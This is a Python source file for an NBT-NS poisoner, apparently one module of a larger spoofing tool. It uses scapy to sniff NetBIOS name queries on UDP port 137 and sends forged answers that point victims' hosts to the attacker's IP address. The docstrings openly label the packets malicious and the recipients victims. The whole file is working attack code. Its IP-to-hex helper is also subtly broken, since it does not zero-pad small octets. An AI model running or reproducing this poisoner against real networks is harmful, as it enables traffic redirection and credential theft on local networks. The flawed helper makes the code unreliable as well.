#!/usr/bin/env python3
from typing import List, Tuple, Type
import binascii
from scapy.all import (
    Ether,
    IP,
    UDP,
    sendp,
    sniff,
    packet,
    IPv6,
    NBNSQueryRequest,
    Raw,
    DNSQR,
)
from .poisonnetwork import PoisonNetwork
import time
from loguru import logger
from threading import Thread
from colorama import Fore, Style


class NBT_NS(PoisonNetwork):
    """[ NBT_NS poisoner ]
    Args:
        ip (str): [ if of the attacker ]
        ipv6 (str): [ ipv6 of the attacker ]
        mac_address (str): [ mac of the attacker ]
        iface (str): [ interface of the current subnet used ]
        info_logger (logger): [ Logger for the output ]
        level (logger): [ Logger level to display information ]
    """

    def __init__(
        self,
        ip: str,
        mac_address: str,
        iface: str,
        info_logger: logger,
        level: str = "INFO",
    ):
        super().__init__(ip, None, mac_address, iface, info_logger, level)

    def __transport_layer(self, response: packet) -> packet:
        """[ Add transport layer to the response packet ]

        Args:
            response (packet): [ Packet to be send to the victim ]

        Returns:
            packet: [ Malicious packet ]
        """
        response /= UDP(sport=137, dport=137)
        return response

    def __ip_to_hex(self) -> bytes:
        """[ Method to pass an ip to hexadecimal ]
        Returns:
            bytes: [ the hexadecimal value of the ip in a bytearray ]
        """
        ip_splited = self.ip.split(".")
        ip_hex = ""
        for number in ip_splited:
            ip_hex = ip_hex + hex(int(number))[2:]
        return bytearray.fromhex(ip_hex)

    def __application_layer(self, pkt: packet, response: packet) -> packet:
        """[ Add application layer to the response packet ]

        Args:
            pkt (packet): [ Sniffed packet ]
            response (packet): [ packet to be send to the victim ]

        Returns:
            packet: [ Malicious packet ]
        """

        response /= NBNSQueryRequest(
            NAME_TRN_ID=pkt[NBNSQueryRequest].NAME_TRN_ID,
            FLAGS=0x8500,  # 34048
            QDCOUNT=0,
            ANCOUNT=1,
            NSCOUNT=0,
            ARCOUNT=0,
            QUESTION_NAME=pkt[NBNSQueryRequest].QUESTION_NAME,
            SUFFIX=pkt[NBNSQueryRequest].SUFFIX,
            NULL=0,
            QUESTION_TYPE=pkt[NBNSQueryRequest].QUESTION_TYPE,
            QUESTION_CLASS=pkt[NBNSQueryRequest].QUESTION_CLASS,
        )
        response /= Raw()
        # TTL:165
        response[Raw].load += b"\x00\x00\x00\xa5"
        # Data length: 6
        response[Raw].load += b"\x00\x06"
        # Flags: (B-node,unique)
        response[Raw].load += b"\x00\x00"
        # ip 0.0.0.0

        response[Raw].load += self.__ip_to_hex()
        return response

    def __send_packet(self, response: packet, ip_of_the_packet: str) -> None:
        """[ Function to send the malicious packet to the victim ]

        Args:
            response (packet): [ Malicious packet ]
            ip_of_the_packet (str): [ ip of the victim ]
        """
        self.info_logger.debug("Packet crafted: ")
        self.info_logger.debug(response.summary())
        if ip_of_the_packet not in self.targets_used:
            self.info_logger.log(
                self.logger_level,
                f"{Fore.CYAN}(NBT_NS) Sending packet to {ip_of_the_packet}{Style.RESET_ALL}",
            )
            sendp(response, verbose=False)
            self.targets_used.append(ip_of_the_packet)

    def __craft_malicious_packets(self, pkt: packet) -> None:
        """[ Function to craft a malicious packet ]

        Args:
            pkt (packet): [ Sniffed packet ]
        """
        if pkt.haslayer(NBNSQueryRequest) and pkt.haslayer(IP) and pkt[IP].src != self.ip:
            response = self._data_link_layer(pkt)
            response, ip_of_the_packet = self._network_layer(pkt, response)
            response = self.__transport_layer(response)
            response = self.__application_layer(pkt, response)
            self.__send_packet(response, ip_of_the_packet)

    def start_nbt_ns_poisoning(self) -> None:
        """[ Function to start the poisoner ]"""
        self.info_logger.log(self.logger_level, "Starting nbt-ns poisoning...")
        self._start_cleaner()
        sniff(
            filter="udp and port 137",
            iface=self.iface,
            prn=self.__craft_malicious_packets,
            store=0,
        )
